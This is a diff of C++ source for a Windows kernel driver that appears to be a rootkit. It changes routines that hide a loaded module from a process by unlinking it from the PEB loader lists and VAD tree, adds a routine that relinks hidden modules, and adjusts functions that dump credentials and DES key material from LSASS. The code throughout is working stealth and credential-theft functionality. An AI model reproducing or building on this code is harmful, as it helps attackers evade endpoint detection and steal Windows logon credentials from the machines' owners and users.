@@ -477,7 +477,7 @@ NTSTATUS MemoryHandler::PatchModule(_In_ IoctlPatchedModule& moduleInformation) 
 */
 _IRQL_requires_max_(APC_LEVEL)
 NTSTATUS MemoryHandler::HideModule(_In_ IoctlHiddenModuleInfo& moduleInformation) {
-	PLDR_DATA_TABLE_ENTRY pebEntry;
+	PLDR_DATA_TABLE_ENTRY pebEntry = nullptr;
 	KAPC_STATE state;
 	NTSTATUS status = STATUS_SUCCESS;
 	PEPROCESS targetProcess = NULL;
@@ -529,6 +529,7 @@ NTSTATUS MemoryHandler::HideModule(_In_ IoctlHiddenModuleInfo& moduleInformation
 		if (pebEntry) {
 			if (pebEntry->FullDllName.Length > 0) {
 				if (_wcsnicmp(pebEntry->FullDllName.Buffer, moduleInformation.ModuleName, pebEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
+					entry.OriginalEntry = pListEntry;
 					entry.ModuleName = moduleInformation.ModuleName;
 					entry.Pid = moduleInformation.Pid;
 					entry.Links.InLoadOrderLinks = pebEntry->InLoadOrderLinks;
@@ -548,11 +549,25 @@ NTSTATUS MemoryHandler::HideModule(_In_ IoctlHiddenModuleInfo& moduleInformation
 	}
 	KeUnstackDetachProcess(&state);
 
-	if (NT_SUCCESS(status))
+	// Need to handle the case where the module is incorrectly hidden carefully to avoid BSOD.
+	if (NT_SUCCESS(status)) {
 		status = VadHideObject(targetProcess, reinterpret_cast<ULONG_PTR>(moduleBase), entry);
 
-	if (NT_SUCCESS(status))
-		AddHiddenModule(entry);
+		if (!NT_SUCCESS(status)) {
+			status = RestorePebModule(targetProcess, &entry);
+			ObDereferenceObject(targetProcess);
+			return status;
+		}
+
+		if (!AddHiddenModule(entry)) {
+			status = STATUS_INSUFFICIENT_RESOURCES;
+			ObDereferenceObject(targetProcess);
+			RestoreModule(&entry);
+			return status;
+		}
+	}
+
+
 	ObDereferenceObject(targetProcess);
 	return status;
 }
@@ -618,42 +633,12 @@ NTSTATUS MemoryHandler::RestoreModule(_In_ HiddenModuleEntry* moduleEntry) {
 
 	if (!NT_SUCCESS(status))
 		return status;
-	KeStackAttachProcess(targetProcess, &state);
-	PREALPEB targetPeb = reinterpret_cast<PREALPEB>(PsGetProcessPeb(targetProcess));
+	status = RestorePebModule(targetProcess, moduleEntry);
 
-	if (!targetPeb) {
-		KeUnstackDetachProcess(&state);
+	if (!NT_SUCCESS(status)) {
 		ObDereferenceObject(targetProcess);
-		return STATUS_ABANDONED;
+		return status;
 	}
-
-	for (UINT16 i = 0; !targetPeb->LoaderData && i < 10; i++) {
-		KeDelayExecutionThread(KernelMode, FALSE, &time);
-	}
-
-	if (!targetPeb->LoaderData) {
-		KeUnstackDetachProcess(&state);
-		ObDereferenceObject(targetProcess);
-		return STATUS_ABANDONED_WAIT_0;
-	}
-
-	if (!&targetPeb->LoaderData->InLoadOrderModuleList) {
-		KeUnstackDetachProcess(&state);
-		ObDereferenceObject(targetProcess);
-		return STATUS_ABANDONED_WAIT_0;
-	}
-
-	PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
-	pebEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
-
-	if (pebEntry) {
-		InsertTailList(&pebEntry->InLoadOrderLinks, &moduleEntry->Links.InLoadOrderLinks);
-		InsertTailList(&pebEntry->InInitializationOrderLinks, &moduleEntry->Links.InInitializationOrderLinks);
-		InsertTailList(&pebEntry->InMemoryOrderLinks, &moduleEntry->Links.InMemoryOrderLinks);
-		InsertTailList(&pebEntry->HashLinks, &moduleEntry->Links.HashLinks);
-		status = STATUS_SUCCESS;
-	}
-	KeUnstackDetachProcess(&state);
 
 	if (NT_SUCCESS(status))
 		status = VadRestoreObject(targetProcess, moduleEntry->VadNode, moduleEntry->ModuleName);
@@ -663,6 +648,99 @@ NTSTATUS MemoryHandler::RestoreModule(_In_ HiddenModuleEntry* moduleEntry) {
 		status = STATUS_UNSUCCESSFUL;
 	ObDereferenceObject(targetProcess);
 	return status;
+}
+
+/*
+* Description:
+* RestorePebModule is responsible for restoring a hidden user mode module that is loaded in a process.
+* 
+* Parameters:
+* @process		[_In_ PEPROCESS&]		  -- Required information, contains the process's EPROCESS.
+* @moduleEntry	[_In_ HiddenModuleEntry&] -- Required information, contains the module's entry.
+* 
+* Returns:
+* @NTSTATUS								  -- Whether successfuly restored or not.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+NTSTATUS MemoryHandler::RestorePebModule(_In_ PEPROCESS& process, _In_ HiddenModuleEntry* moduleEntry) {
+	KAPC_STATE state = { 0 };
+	PLDR_DATA_TABLE_ENTRY pebEntry = nullptr;
+	LARGE_INTEGER time = { 0 };
+	time.QuadPart = ONE_SECOND;
+
+	constexpr auto RestoreEntry = [](PLDR_DATA_TABLE_ENTRY pebEntry, HiddenModuleEntry* entry) -> bool {
+		if (IsInvalidListEntry(&pebEntry->InLoadOrderLinks) || IsInvalidListEntry(&pebEntry->InInitializationOrderLinks) ||
+			IsInvalidListEntry(&pebEntry->InMemoryOrderLinks) || IsInvalidListEntry(&pebEntry->HashLinks)) {
+			return false;
+		}
+		__try {
+			InsertTailList(&pebEntry->InLoadOrderLinks, &entry->Links.InLoadOrderLinks);
+			InsertTailList(&pebEntry->InInitializationOrderLinks, &entry->Links.InInitializationOrderLinks);
+			InsertTailList(&pebEntry->InMemoryOrderLinks, &entry->Links.InMemoryOrderLinks);
+			InsertTailList(&pebEntry->HashLinks, &entry->Links.HashLinks);
+		}
+		__except (EXCEPTION_EXECUTE_HANDLER) {
+			return false;
+		}
+		return true;
+	};
+
+	if (!process)
+		return STATUS_INVALID_PARAMETER;
+
+	KeStackAttachProcess(process, &state);
+	PREALPEB targetPeb = reinterpret_cast<PREALPEB>(PsGetProcessPeb(process));
+
+	if (!targetPeb) {
+		KeUnstackDetachProcess(&state);
+		return STATUS_ABANDONED;
+	}
+
+	for (UINT16 i = 0; !targetPeb->LoaderData && i < 10; i++) {
+		KeDelayExecutionThread(KernelMode, FALSE, &time);
+	}
+
+	if (!targetPeb->LoaderData) {
+		KeUnstackDetachProcess(&state);
+		return STATUS_ABANDONED_WAIT_0;
+	}
+
+	if (!&targetPeb->LoaderData->InLoadOrderModuleList) {
+		KeUnstackDetachProcess(&state);
+		return STATUS_ABANDONED_WAIT_0;
+	}
+
+	if (moduleEntry->OriginalEntry->Blink) {
+		pebEntry = CONTAINING_RECORD(moduleEntry->OriginalEntry->Blink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
+		if (RestoreEntry(pebEntry, moduleEntry)) {
+			KeUnstackDetachProcess(&state);
+			return STATUS_SUCCESS;
+		}
+	}
+	if (moduleEntry->OriginalEntry->Flink) {
+		pebEntry = CONTAINING_RECORD(moduleEntry->OriginalEntry->Flink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
+		if (RestoreEntry(pebEntry, moduleEntry)) {
+			KeUnstackDetachProcess(&state);
+			return STATUS_SUCCESS;
+		}
+	}
+	for (PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
+		pListEntry != &targetPeb->LoaderData->InLoadOrderModuleList;
+		pListEntry = pListEntry->Flink) {
+
+		pebEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
+		if (pebEntry) {
+			if (RestoreEntry(pebEntry, moduleEntry)) {
+				KeUnstackDetachProcess(&state);
+				return STATUS_SUCCESS;
+			}
+		}
+	}
+	KeUnstackDetachProcess(&state);
+	return STATUS_UNSUCCESSFUL;
 }
 
 /*
@@ -816,7 +894,7 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 			status = STATUS_NOT_FOUND;
 			break;
 		}
-		cachedLsassInfo.Creds = AllocateMemory<Credentials*>(credentialsCount * sizeof(Credentials));
+		cachedLsassInfo.Creds = AllocateMemory<IoctlCredentials*>(credentialsCount * sizeof(IoctlCredentials));
 
 		if (!cachedLsassInfo.Creds) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
@@ -1052,7 +1130,7 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
 * @status	 [NTSTATUS]			 -- Whether successfuly sent or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-NTSTATUS MemoryHandler::GetCredentials(_Inout_ IoctlCredentials* credentials) {
+NTSTATUS MemoryHandler::GetCredentials(_Inout_ IoctlCredentialsInformation* credentials) {
 	SIZE_T bytesWritten = 0;
 	SIZE_T i = 0;
 	NTSTATUS status = STATUS_SUCCESS;
@@ -1078,7 +1156,7 @@ NTSTATUS MemoryHandler::GetCredentials(_Inout_ IoctlCredentials* credentials) {
 
 	MemoryGuard desKeyGuard(credentials->DesKey.Data, cachedLsassInfo.DesKey.Size, UserMode);
 	MemoryGuard ivGuard(credentials->Iv.Data, cachedLsassInfo.Iv.Size, UserMode);
-	MemoryGuard credentialGuard(credentials->Creds, static_cast<ULONG>(sizeof(Credentials) * cachedLsassInfo.Count), UserMode);
+	MemoryGuard credentialGuard(credentials->Creds, static_cast<ULONG>(sizeof(IoctlCredentials) * cachedLsassInfo.Count), UserMode);
 
 	if (!desKeyGuard.IsValid() || !credentialGuard.IsValid() || !ivGuard.IsValid())
 		return STATUS_INVALID_ADDRESS;
@@ -1296,8 +1374,8 @@ TABLE_SEARCH_RESULT MemoryHandler::VadFindNodeOrParent(_In_ PRTL_AVL_TABLE table
 		startAddress = static_cast<ULONG_PTR>(virtualAddressToCompare->StartingVpn);
 		endAddress = static_cast<ULONG_PTR>(virtualAddressToCompare->EndingVpn);
 
-		startAddress |= static_cast<ULONG_PTR>(virtualAddressToCompare->StartingVpnHigh) << 32;
-		endAddress |= static_cast<ULONG_PTR>(virtualAddressToCompare->EndingVpnHigh) << 32;
+		startAddress |= static_cast<ULONG_PTR>(virtualAddressToCompare->StartingVpnHigh) << VPN_SHIFT;
+		endAddress |= static_cast<ULONG_PTR>(virtualAddressToCompare->EndingVpnHigh) << VPN_SHIFT;
 
 		if (targetPageAddress < startAddress) {
 			child = nodeToCheck->Left;
@@ -1310,7 +1388,7 @@ TABLE_SEARCH_RESULT MemoryHandler::VadFindNodeOrParent(_In_ PRTL_AVL_TABLE table
 			result = TableInsertAsLeft;
 			break;
 		}
-		else if (targetPageAddress <= endAddress) {
+		else if (targetPageAddress >= startAddress && targetPageAddress <= endAddress) {
 			*outNode = nodeToCheck;
 			result = TableFoundNode;
 			break;
